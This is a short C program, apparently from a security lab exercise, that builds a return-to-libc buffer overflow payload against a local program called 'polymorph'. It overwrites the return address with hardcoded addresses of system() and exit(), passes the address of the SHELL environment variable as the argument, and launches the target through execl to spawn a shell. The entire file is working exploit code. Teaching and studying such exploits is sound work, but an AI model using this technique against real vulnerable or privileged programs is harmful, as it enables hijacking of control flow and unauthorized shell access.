#include <stdio.h>
#include <stdlib.h>

#define OFFSET_TO_RETURN_ADDR 1032// 4128
#define OFFSET_TO_ARG_1 1041 //4164   // Argument 1 stroe at saved ebp+8 (4156+8)
#define SYSTEM_CALL_ADDRESS 0xb7e42160
#define EXIT_CALL_ADDRESS 0xb7e35c90

int main(int argc, char *argv[]){

    // filename will be feed into the target buffer in polyporph 
    // then original, then newname

    // char filename[4164];
    int filename[OFFSET_TO_ARG_1 + 1];

    // file the buffer with random datae
    memset(filename, 0xaa, sizeof(filename));

    // get the address of the value of environment variable SHELL
    // which contains string /bin/bash
    char* addr_shell = getenv("SHELL");
    printf("address of SHELL %p\n", addr_shell);

    filename[OFFSET_TO_ARG_1] = (unsigned)addr_shell;
    filename[OFFSET_TO_RETURN_ADDR] = SYSTEM_CALL_ADDRESS;
    filename[OFFSET_TO_RETURN_ADDR + 1] = EXIT_CALL_ADDRESS;

    // execute the victim program and feed in the exploit inpu
    execl("./polymorph", "polymorph", "-f", (char*)filename, NULL);

    return 0;

}
